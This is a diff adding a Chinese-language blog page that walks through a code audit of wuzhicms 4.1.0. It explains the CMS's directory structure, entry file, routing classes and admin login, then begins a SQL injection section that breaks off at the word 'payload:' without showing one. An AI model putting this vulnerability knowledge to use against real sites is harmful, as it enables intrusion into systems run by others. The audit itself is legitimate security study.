@@ -1,0 +1,1058 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ADD8E6">
+  <meta name="author" content="bxhhf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="wuzhicms_4.1.0代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wuzhicms">
+<meta property="og:url" content="https://bxhhf.github.io/2025/08/27/yuque-hexo-post/wuzhicms/index.html">
+<meta property="og:site_name" content="bxhhf">
+<meta property="og:description" content="wuzhicms_4.1.0代码审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752909676951-7f374364-4992-497a-aa0d-0616d4f83c9e.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752910689328-3525c9e5-f012-4fe1-986d-3b1bbd9123e6.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752996458707-1776935c-7494-4461-9cfd-0492899389b0.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752923334324-c1d6d104-6d86-4344-bdff-1732c8a59418.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752925927586-14d52fb8-fd2d-4d21-9c20-7d9d4b9ed64b.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752999188658-3312cd25-620e-4857-aebf-cca88dde9a03.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752999682295-08b8c1e9-f795-4604-87de-f64c0e13b28a.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753001686474-e8aaceaf-89ef-4893-bb08-d8ddbc4fa520.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753010666455-d39ba572-75f5-4cc3-852d-d67ed7b39f81.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752980981068-0a8d21aa-e036-4728-bb97-291f48df5bcb.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753075398703-bd22ff2a-b1b9-49bd-892b-bdc04c7010c4.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080218359-70c593f1-4cb7-4f06-9349-fe5e30640505.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753016780482-d1b05019-7136-40bf-8db5-a0956b9b8611.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753079272438-47519d69-9186-4cc3-ad8c-9d138d0519e5.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080513979-9287fe50-69bc-4ddb-a491-888067f12ec2.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080738235-86c2929d-ad7e-4d0a-8e8e-558ef20f628a.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087267459-6425ad50-2efc-44ad-8022-824432562dc9.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087745037-714609b5-c856-492b-830d-33d0396d44e5.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087692662-4fd6d938-0863-476b-a828-51c6989a2d5f.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753093920418-e5b406f0-2752-484a-a3c2-ce034144a133.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753093952917-a61182f0-a59c-439f-96b0-263d90953ad5.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753097118332-d057601f-adc0-404d-92a8-33b35338d5fa.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753095213085-4dcf243f-ce5e-458b-947f-76b12a354b8b.png">
+<meta property="og:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753097168912-bce1022e-d090-4c06-b943-12633dbf4693.png">
+<meta property="article:published_time" content="2025-08-27T11:22:56.000Z">
+<meta property="article:modified_time" content="2025-08-27T12:18:40.113Z">
+<meta property="article:author" content="bxhhf">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752909676951-7f374364-4992-497a-aa0d-0616d4f83c9e.png">
+  
+  
+  
+  <title>wuzhicms - bxhhf</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_3846514_kabxni94auf.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bxhhf.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"enable":true,"app_id":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","app_key":"gbgqDB024hr2I7jmwbO6Mz2a","server_url":"https://an6azuya.lc-cn-n1-shared.com","enable_sync":false,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://registry.npmmirror.com/lxgw-wenkai-screen-web/latest/files/style.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">bxhhf</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/8.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="wuzhicms"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-27 19:22" pubdate>
+          2025年8月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          54 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">wuzhicms</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年8月27日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>wuzhicms_4.1.0代码审计</p>
+<span id="more"></span>
+
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="一-理清目录结构"><a href="#一-理清目录结构" class="headerlink" title="一.理清目录结构"></a>一.理清目录结构</h2><ol>
+<li><p>首先发现是 MVC 架构，相比 yccms 的没那么明显，WWW\wuzhicms-4.1.0\www\api\uc_client 下面就是模型层和控制器层。</p>
+</li>
+<li><p>文档中写有模块结构的：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">|-- coreframe                   #框架目录<br>|   |-- app                     #模块（应用程序）目录<br>|   |   |-- affiche             #公告模块<br>|   |   |-- appshop             #应用商城<br>|   |   |-- attachment          #附件模块<br>|   |   |-- collect             #采集器<br>....................其他功能模块<br>.............<br>.......<br>|   |-- configs                 #框架配置<br>|   |-- core.php                #框架入口<br>|   |-- crontab                 #定时脚本目录<br>|   |-- crontab.php             #定时脚本入口<br>|   |-- extend                  #扩展目录<br>|   |-- languages               #语言包<br>|   --- templates               #模板<br>|-- caches                      #缓存目录<br>|   |-- _cache_                 #公共缓存<br>|   |-- block                   #区块、碎片缓存<br>|   |-- content                 #内容模块缓存，栏目缓存<br>|   |-- db_bak                  #数据库备份路径<br>|   |-- install.check           #安装锁定<br>|   |-- model                   #模型缓存<br>|   --- templates               #模板缓存<br>--- www                         #网站根目录<br>    |-- 404.html                #404页面<br>    |-- admin.php               #后台入口<br>    |-- api                     #api目录<br>    |-- configs                 #网站配置<br>    |-- favicon.ico             #浏览器icon<br>    |-- index.html              #网站首页<br>    |-- index.php               #动态地址首页<br>    |-- res                     #静态资源<br>    |-- robots.txt              #搜索引擎防抓取规则<br>    |-- uploadfile              #附件<br>    `-- web.php                 #自定义路由<br></code></pre></td></tr></table></figure>
+
+<h2 id="二-入口文件及路由分析"><a href="#二-入口文件及路由分析" class="headerlink" title="二.入口文件及路由分析"></a>二.入口文件及路由分析</h2><h3 id="2-1-入口文件"><a href="#2-1-入口文件" class="headerlink" title="2.1 入口文件"></a>2.1 入口文件</h3><ol>
+<li>入口文件：WWW\wuzhicms-4.1.0\www\index.php 。</li>
+</ol>
+<p>$app 是实例化类 WUZHI_application 返回的对象，执行 run 方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>//检测PHP环境<br>if(PHP_VERSION &lt; &#x27;5.2.0&#x27;) die(&#x27;Require PHP &gt; 5.2.0 &#x27;);<br>//定义当前的网站物理路径<br>define(&#x27;WWW_ROOT&#x27;,dirname(__FILE__).&#x27;/&#x27;);<br><br>require &#x27;./configs/web_config.php&#x27;;<br>require COREFRAME_ROOT.&#x27;core.php&#x27;;<br><br>$app = load_class(&#x27;application&#x27;);<br>$app-&gt;run();<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>load_class 跟进去：是要加载 coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;application.class.php 文件，实例化 WUZHI_application 类并返回赋值给$app</p>
+<p><strong>存在 coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;$class.php就实例化返回’WUZHI’_.$class 对象</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>function load_class($class, $m = &#x27;core&#x27;, $param = NULL) &#123;<br>    .....<br>    if (file_exists(COREFRAME_ROOT.&#x27;app/&#x27;.$m.&#x27;/libs/class/&#x27;.$class.&#x27;.class.php&#x27;)) &#123;<br>        $name = &#x27;WUZHI_&#x27;.$class;<br>        if (class_exists($name, FALSE) === FALSE) &#123;<br>            require_once(COREFRAME_ROOT.&#x27;app/&#x27;.$m.&#x27;/libs/class/&#x27;.$class.&#x27;.class.php&#x27;);<br>        &#125;<br>    &#125;<br>     //如果存在扩展类，则初始化扩展类<br>    if ($class!=&#x27;application&#x27; &amp;&amp; $class!=&#x27;admin&#x27; &amp;&amp; file_exists(COREFRAME_ROOT.&#x27;app/&#x27;.$m.&#x27;/libs/class/EXT_&#x27;.$class.&#x27;.class.php&#x27;)) &#123;<br>        $name = &#x27;EXT_&#x27;.$class;<br>        if (class_exists($name, FALSE) === FALSE) &#123;<br>            require_once(COREFRAME_ROOT.&#x27;app/&#x27;.$m.&#x27;/libs/class/EXT_&#x27;.$class.&#x27;.class.php&#x27;);<br>        &#125;<br>    &#125;<br><br>    if ($name === FALSE) &#123;<br>        $full_dir = &#x27;&#x27;;<br>        if(OPEN_DEBUG) $full_dir = COREFRAME_ROOT.&#x27;app/&#x27;.$m.&#x27;/libs/class/&#x27;;<br>        echo &#x27;Unable to locate the specified class: &#x27;.$full_dir.$class.&#x27;.class.php&#x27;;<br>        exit();<br>    &#125;<br><br>    $static_class[$class] = isset($param) ? new $name($param) : new $name();<br>    return $static_class[$class];//这里返回！！<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-路由文件"><a href="#2-2-路由文件" class="headerlink" title="2.2 路由文件"></a>2.2 路由文件</h3><p>WUZHI_application 类在 coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;application.class.php 文件里</p>
+<p><em><strong>它是整个应用的核心类，负责前端请求到后端控制器的连接与实例化。（load_file 方法里）</strong></em></p>
+<blockquote>
+<p><font style="color:rgb(17, 17, 17);">补充：在 PHP 中，</font><strong><font style="color:rgb(17, 17, 17);">final</font></strong><font style="color:rgb(17, 17, 17);"> 关键字用于防止类被继承或方法被重写。通过在类或方法定义前加上 </font><strong><font style="color:rgb(17, 17, 17);">final</font></strong><font style="color:rgb(17, 17, 17);"> 关键字，可以确保其行为不被子类修改。</font></p>
+</blockquote>
+<p>application.class.php 文件即为路由文件：</p>
+<p>m:模块名</p>
+<p>f:文件名</p>
+<p>v:方法名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br><br>defined(&#x27;IN_WZ&#x27;) or exit(&#x27;No direct script access allowed&#x27;);<br>/**<br> * M/F/V 路由<br> */<br>final class WUZHI_application &#123;<br>	/**<br>	 * @var app，模块名，取值方式：M<br>	 */<br>    private $_m;<br>	/**<br>	 * @var 文件名 取值方式：F<br>	 */<br>    private $_f;<br>	/**<br>	 * @var 方法名 取值方式：V<br>	 */<br>    private $_v;<br><br>	......<br></code></pre></td></tr></table></figure>
+
+<p><strong>方法：</strong></p>
+<ul>
+<li>构造器：初始化路由配置，并定义当前请求的模块，文件名，方法三个常量</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function __construct() &#123;<br>       self::setconfig();<br>       define(&#x27;M&#x27;,$this-&gt;_m);<br>       define(&#x27;F&#x27;,$this-&gt;_f);<br>       define(&#x27;V&#x27;,$this-&gt;_v);<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>setconfig():设置当前请求路由的参数并进行安全过滤，预先设置自动注入全局 GET 参数。</li>
+</ul>
+<blockquote>
+<p>（就是在路由配置文件里通过 _get 字段预先设置的参数。 这些参数会在每次请求时自动写入 $_GET，全局都能用。这样做的目的是：在路由初始化时，自动为$_GET 补充一些参数，便于后续业务逻辑统一获取。）</p>
+</blockquote>
+<ul>
+<li><p>safe():对传入的字符串进行过滤，去除特殊的字符。</p>
+</li>
+<li><p>. run()<br>加载控制器类，判断站点状态，调用对应的方法（动作）。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$file = $this-&gt;load_file();<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>load_file() 判断是否是后台请求，前端请求如果带有特殊的 _su 参数且等于 _SU 常量，则说明是后台请求<br>该方法用于加载并实例化指定模块下的控制器类，并<strong>返回该控制器的对象实例。</strong><br>也就是说，调用此方法后，返回的就是要访问的模块下对应控制器的类对象。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plain"> public static function load_file($filename = &#x27;&#x27;, $app = &#x27;&#x27;, $param = &#x27;&#x27;) &#123;<br>        static $static_file = array();<br>        if(isset($GLOBALS[&#x27;_su&#x27;]) &amp;&amp; $GLOBALS[&#x27;_su&#x27;]== _SU) &#123;<br>            $_admin_dir = &#x27;/admin&#x27;;<br>        &#125; else &#123;<br>            $_admin_dir = &#x27;&#x27;;<br>        &#125;<br>        //判断是否存在类，存在则直接返回<br>        if (isset($static_file[$filename])) &#123;<br>            return $static_file[$filename];<br>        &#125;<br>        if (empty($filename)) $filename = F;<br>        if (empty($app)) $app = M;<br>        $filepath = COREFRAME_ROOT.&#x27;app/&#x27;.$app.$_admin_dir.&#x27;/&#x27;.$filename.&#x27;.php&#x27;;<br>        $name = FALSE;<br>        if (file_exists($filepath)) &#123;<br>            //$name = &#x27;WUZHI_&#x27;.$filename;<br>            $name = $filename;<br>            if (class_exists($name, FALSE) === FALSE) &#123;<br>                require_once($filepath);<br>            &#125;<br>        &#125;<br>        //如果存在扩展类，则初始化扩展类<br>        if (file_exists(COREFRAME_ROOT.&#x27;app/&#x27;.$app.$_admin_dir.&#x27;/EXT_&#x27;.$filename.&#x27;.php&#x27;)) &#123;<br>            $name = &#x27;EXT_&#x27;.$filename;<br>            if (class_exists($name, FALSE) === FALSE) &#123;<br>                require_once(COREFRAME_ROOT.&#x27;app/&#x27;.$app.$_admin_dir.&#x27;/EXT_&#x27;.$filename.&#x27;.php&#x27;);<br>            &#125;<br>        &#125;<br>        $GLOBALS[&#x27;_CLASS_NAME_&#x27;] = &#x27;&#x27;;<br>        if ($name === FALSE) &#123;<br>            $full_dir = &#x27;&#x27;;<br>            if(OPEN_DEBUG) &#123;<br>                $full_dir = COREFRAME_ROOT.&#x27;app/&#x27;.$app.$_admin_dir.&#x27;/&#x27;;<br>            &#125; else &#123;<br>                $full_dir = &#x27;/coreframe/app/&#x27;.$app.$_admin_dir.&#x27;/&#x27;;<br>            &#125;<br>            $filename = strip_tags($filename);<br>            echo &#x27;Unable to locate the specified filename: &#x27;.$full_dir.$filename.&#x27;.php&#x27;;<br>            exit();<br>        &#125;<br>        if (class_exists($name, FALSE) === FALSE) &#123;<br>            return TRUE;<br>        &#125;<br>        $GLOBALS[&#x27;_CLASS_NAME_&#x27;] = $name;<br>        $static_file[$filename] = isset($param) ? new $name($param) : new $name();<br>        return $static_file[$filename];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>所以入口文件 load_class()加载路由文件 application.class.php 并实例化，执行其 run 方法进而执行 load_file()实例化控制器类（coreframe&#x2F;app&#x2F;参数 m 传递的值即对应的模块&#x2F;admin($_admin_dir 的默认值)&#x2F;参数 f 传递的文件名.php）</strong></p>
+<p>即文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$filepath = COREFRAME_ROOT.&#x27;app/&#x27;.$app.$_admin_dir.&#x27;/&#x27;.$filename.&#x27;.php&#x27;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-后台登陆"><a href="#2-3-后台登陆" class="headerlink" title="2.3 后台登陆"></a>2.3 后台登陆</h3><p>管理员的入口文件：WWW\wuzhicms-4.1.0\www\admin.php</p>
+<p>重定向到入口文件&#x2F;www&#x2F;index.php，执行入口文件$app-&gt;run(),完成前后端的连接(根据路由参数自动调用控制器中的方法 _SU 为常量 wuzhicms)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">if(defined(&#x27;_SU&#x27;)) &#123; header(&quot;Location:<br>&quot;.WEBURL.&#x27;index.php?m=core&amp;v=login&amp;_su=&#x27;._SU); &#125; ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>找到 login 方法在 coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">function login() &#123;<br>    //已经登陆的用户重定向到后台首页<br>    if (isset($_SESSION[&#x27;uid&#x27;]) &amp;&amp; $_SESSION[&#x27;uid&#x27;]!=&#x27;&#x27;) &#123;<br>        MSG(L(&#x27;already login&#x27;), &#x27;?m=core&amp;f=index&#x27;.$this-&gt;su(0));<br>    &#125;<br>    ......<br></code></pre></td></tr></table></figure>
+
+<h2 id="三-代码审计"><a href="#三-代码审计" class="headerlink" title="三.代码审计"></a>三.代码审计</h2><h3 id="3-1sql-注入"><a href="#3-1sql-注入" class="headerlink" title="3.1sql 注入"></a>3.1sql 注入</h3><h4 id="3-1-1-注入-一）"><a href="#3-1-1-注入-一）" class="headerlink" title="3.1.1 注入(一）"></a>3.1.1 注入(一）</h4><h5 id="3-1-1-1-从功能点开始"><a href="#3-1-1-1-从功能点开始" class="headerlink" title="3.1.1.1 从功能点开始"></a>3.1.1.1 从功能点开始</h5><p>从功能点出发去找，发现了一处 sql 注入报错，’闭合</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752909676951-7f374364-4992-497a-aa0d-0616d4f83c9e.png" srcset="/img/loading.gif" lazyload style="zoom:33%;">
+
+<p>payload:</p>
